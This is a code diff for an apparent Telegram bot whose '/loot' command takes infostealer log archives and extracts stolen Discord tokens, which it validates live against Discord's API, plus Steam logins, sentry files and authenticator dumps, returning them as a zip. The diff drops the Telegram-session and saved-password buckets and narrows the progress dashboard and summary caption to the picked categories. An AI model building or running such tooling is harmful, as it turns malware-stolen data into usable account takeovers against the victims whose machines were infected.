@@ -6,16 +6,12 @@ an archive for browser cookies that match a target domain, ``/loot``
 walks the same kind of archive for the *rest* of the stuff stealer
 logs contain:
 
-* Telegram Desktop ``tdata`` session folders (re-zipped per account)
 * Discord auth tokens (live-validated against ``/users/@me``)
 * Steam account logins, sentry files and Mobile Authenticator dumps
-* Saved-password dumps (rendered as ULP + combo lists, with optional
-  per-domain filtering)
 
 The conversation is intentionally short:
 
-  ``/loot``                          → "Send me an archive"
-  ``/loot domain1.com, domain2.com`` → adds targeted combo lists
+  ``/loot`` → sub-picker (All / Discord / Steam) → "Send me an archive"
 
 Heavy lifting (download, password prompts, archive extraction, scan,
 validation, bundling) runs inside the shared :class:`JobQueue` worker
@@ -57,9 +53,7 @@ from services.loot_extractor import (
     ALL_LOOT_BUCKETS,
     LOOT_ALL,
     LOOT_DISCORD,
-    LOOT_PASSWORDS,
     LOOT_STEAM,
-    LOOT_TDATA,
     LootExtractionConfig,
     run_loot_extraction_async,
 )
@@ -110,11 +104,9 @@ def _loot_cancel_kb() -> InlineKeyboardMarkup:
 
 # Bucket buttons shown in the sub-picker. ``(callback_data, label)``
 _LOOT_TYPE_BUTTONS = [
-    (LOOT_ALL, "\U0001f4e6 All Loot"),
-    (LOOT_TDATA, "\U0001f4f1 tdata (Telegram sessions)"),
-    (LOOT_DISCORD, "\U0001f3ae Discord tokens"),
-    (LOOT_STEAM, "\U0001f3ae Steam accounts"),
-    (LOOT_PASSWORDS, "\U0001f511 Passwords (ULP / combos)"),
+    (LOOT_ALL, "\U0001f4e6 All Loot (Discord + Steam)"),
+    (LOOT_DISCORD, "\U0001f3ae Discord tokens only"),
+    (LOOT_STEAM, "\U0001f3ae Steam accounts only"),
 ]
 
 
@@ -137,23 +129,37 @@ def _buckets_from_pick(pick: str) -> frozenset[str]:
     return frozenset({pick})
 
 
-def _loot_bucket_lines(progress: ExtractionProgress) -> str:
+def _loot_bucket_lines(
+    progress: ExtractionProgress,
+    buckets: "frozenset[str] | None" = None,
+) -> str:
     """Render the per-bucket count / status block shared by every loot
-    phase. ``loot_bucket`` indicates the scanner currently running;
-    ``loot_counts`` holds the per-bucket totals as they're finalised."""
+    phase.
+
+    ``loot_bucket`` indicates the scanner currently running;
+    ``loot_counts`` holds the per-bucket totals as they're finalised.
+    *buckets* is the user-selected subset — when present we only render
+    the lines for the picked buckets so the dashboard stays focused on
+    what was actually requested.
+    """
     counts = getattr(progress, "loot_counts", {}) or {}
     valid_counts = getattr(progress, "loot_valid_counts", {}) or {}
     active = getattr(progress, "loot_bucket", "") or ""
     if not counts and not active:
         return ""
     emoji = {
-        "tdata": "\U0001f4f1",
         "discord": "\U0001f3ae",
         "steam": "\U0001f3ae",
-        "passwords": "\U0001f511",
     }
+    bucket_to_name = {LOOT_DISCORD: "discord", LOOT_STEAM: "steam"}
+    if buckets:
+        wanted = {bucket_to_name[b] for b in buckets if b in bucket_to_name}
+    else:
+        wanted = {"discord", "steam"}
     out: List[str] = []
-    for name in ("tdata", "discord", "steam", "passwords"):
+    for name in ("discord", "steam"):
+        if name not in wanted:
+            continue
         if name not in counts and name != active:
             continue
         e = emoji.get(name, "\u2022")
@@ -177,20 +183,24 @@ def _loot_bucket_lines(progress: ExtractionProgress) -> str:
     return "\n".join(out)
 
 
-def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
+def _loot_progress_text(
+    progress: ExtractionProgress,
+    elapsed: float,
+    buckets: "frozenset[str] | None" = None,
+) -> str:
     """Compact dashboard message for the loot worker.
 
     Per-bucket counts + an indicator for the currently-running scanner
     are appended underneath the phase summary so the user can see what
-    the bot is actually doing right now (e.g. ``tdata 2`` /
-    ``discord scanning…``).
+    the bot is actually doing right now (e.g. ``discord scanning…``).
+    Only buckets the user actually selected are shown.
     """
     phase = progress.phase
     cur_file = (progress.current_file or "…")
     if len(cur_file) > 40:
         cur_file = cur_file[:37] + "…"
-    buckets = _loot_bucket_lines(progress)
-    buckets_suffix = f"\n{buckets}" if buckets else ""
+    bucket_lines = _loot_bucket_lines(progress, buckets)
+    buckets_suffix = f"\n{bucket_lines}" if bucket_lines else ""
 
     if phase == "downloading":
         pct = (
@@ -228,10 +238,19 @@ def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
         )
     if phase == "scanning":
         active = getattr(progress, "loot_bucket", "") or ""
+        selected_names: List[str] = []
+        bucket_to_name = {LOOT_DISCORD: "Discord", LOOT_STEAM: "Steam"}
+        if buckets:
+            for b in buckets:
+                if b in bucket_to_name:
+                    selected_names.append(bucket_to_name[b])
+        if not selected_names:
+            selected_names = ["Discord", "Steam"]
+        scope = " / ".join(selected_names) or "loot"
         active_line = (
             f"\U0001f50d Scanning bucket: {active}"
             if active else
-            "\U0001f50d Scanning for tdata / Discord / Steam / creds"
+            f"\U0001f50d Scanning for {scope}"
         )
         return (
             f"\U0001f4e6 Loot Job\n"
@@ -266,6 +285,7 @@ def _loot_progress_text(progress: ExtractionProgress, elapsed: float) -> str:
 
 async def _loot_progress_updater(
     msg, job_id: int, progress: ExtractionProgress,
+    buckets: "frozenset[str] | None" = None,
 ) -> None:
     start = time.monotonic()
     last_text = ""
@@ -277,7 +297,7 @@ async def _loot_progress_updater(
                 continue
             if progress.phase == "downloading" and progress.live_download_msg:
                 continue
-            text = _loot_progress_text(progress, elapsed)
+            text = _loot_progress_text(progress, elapsed, buckets)
             if text == last_text:
                 continue
             try:
@@ -295,23 +315,22 @@ async def _loot_progress_updater(
             return
 
 
-def _summary_caption(lr) -> str:
-    """One-liner shipped as the caption of ``loot_results.zip``. Lists
-    the four buckets the user is most likely to care about."""
-    valid_tdata = sum(1 for a in lr.tdata if a.valid)
+def _summary_caption(lr, buckets: "frozenset[str] | None" = None) -> str:
+    """One-liner shipped as the caption of ``loot_results.zip``.
+
+    Only buckets the user actually picked are shown — if they only ran
+    a Discord scan the caption doesn't mention Steam (and vice versa).
+    """
+    show_discord = (not buckets) or (LOOT_DISCORD in buckets)
+    show_steam = (not buckets) or (LOOT_STEAM in buckets)
     live_disc = sum(1 for t in lr.discord if t.valid is True)
     live_steam = sum(1 for a in lr.steam if a.valid is True)
-    creds = len(lr.credentials)
     lines = ["\U0001f4e6 Loot summary"]
-    if lr.tdata:
-        lines.append(f"   tdata: {len(lr.tdata)} ({valid_tdata} valid)")
-    if lr.discord:
+    if show_discord and lr.discord:
         lines.append(f"   discord: {len(lr.discord)} ({live_disc} live)")
-    if lr.steam:
+    if show_steam and lr.steam:
         lines.append(f"   steam: {len(lr.steam)} ({live_steam} live)")
-    if creds:
-        lines.append(f"   credentials: {creds}")
-    if not (lr.tdata or lr.discord or lr.steam or lr.credentials):
+    if len(lines) == 1:
         lines.append("   (no loot found in this archive)")
     return "\n".join(lines)
 
@@ -365,11 +384,6 @@ async def loot_entry(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         "What do you want to extract?\n"
         "Pick a category below, then send me the archive."
     )
-    if target_domains:
-        text += (
-            "\n\nTargeted combos: "
-            + ", ".join(f"<code>{d}</code>" for d in target_domains)
-        )
     msg = update.effective_message
     if update.callback_query:
         await update.callback_query.answer()
@@ -408,15 +422,9 @@ async def loot_type_picked(
     target_domains: List[str] = context.user_data.get(  # type: ignore[union-attr]
         "loot_targets", [],
     )
-    extras: List[str] = []
-    if target_domains:
-        extras.append(
-            "Targeted combos: "
-            + ", ".join(target_domains)
-        )
-    extras.append(
+    extras: List[str] = [
         f"Validation: {'ON' if config.LOOT_VALIDATE else 'OFF'}"
-    )
+    ]
 
     text = (
         f"\U0001f4e6 <b>{label}</b>\n\n"
@@ -607,7 +615,9 @@ async def _process_loot_job(
     try:
         await db.update_job(job_id, status="processing", started_at=db._now())
         updater_task = asyncio.create_task(
-            _loot_progress_updater(progress_msg, job_id, progress),
+            _loot_progress_updater(
+                progress_msg, job_id, progress, buckets=buckets,
+            ),
         )
 
         # Acquire the archive.
@@ -715,7 +725,7 @@ async def _process_loot_job(
         )
         await db.increment_user_stats(user_id, 0, archive_size)
 
-        caption = _summary_caption(lr)
+        caption = _summary_caption(lr, buckets)
         try:
             await progress_msg.edit_text(
                 "\U0001f4e4 Uploading results…",
@@ -737,7 +747,7 @@ async def _process_loot_job(
         # Final status line in chat — replace the live dashboard.
         try:
             await progress_msg.edit_text(
-                _summary_caption(lr) + "\n\n\u2705 Done.",
+                _summary_caption(lr, buckets) + "\n\n\u2705 Done.",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton(
                         "\U0001f4e6 New Loot Scan", callback_data="loot",
